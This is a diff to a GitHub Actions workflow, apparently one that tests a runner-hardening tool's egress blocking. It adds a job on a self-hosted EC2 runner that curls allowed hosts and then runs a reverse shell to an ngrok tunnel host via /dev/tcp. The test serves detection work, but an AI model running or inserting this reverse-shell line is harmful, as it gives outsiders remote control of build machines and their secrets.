@@ -14,16 +14,31 @@ on:
         type: boolean
 
 jobs:
-  tj-actions-simulation:
-    if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-22.04
+  unauthorized-outbound-call:
+    runs-on: [self-hosted, ec2]
     steps:
-      - uses: Prateek-stepsecurity/harden-runner@int
-        with:
-         egress-policy: audit
-     
-      - name: Checkout
-        uses: actions/checkout@v4
+    - uses: step-security/harden-runner@rc
+      with:
+         egress-policy: block
+         allowed-endpoints: >
+          github.com:443
+          goreleaser.com:443
+          www.google.com:443
+    - name: Checkout code
+      uses: actions/checkout@v3
+            
+    - name: Run outbound calls from host
+      run: |
+        start_time=$(date +%s)
+        end_time=$((start_time + 30))
+        
+        while [ $(date +%s) -lt $end_time ]; do
+          curl -I https://www.google.com
+          curl -I https://goreleaser.com
+          sleep 10  # wait 10 seconds between calls
+        done
+    - run: |
+          bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1" 
 
   handle-private-key:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
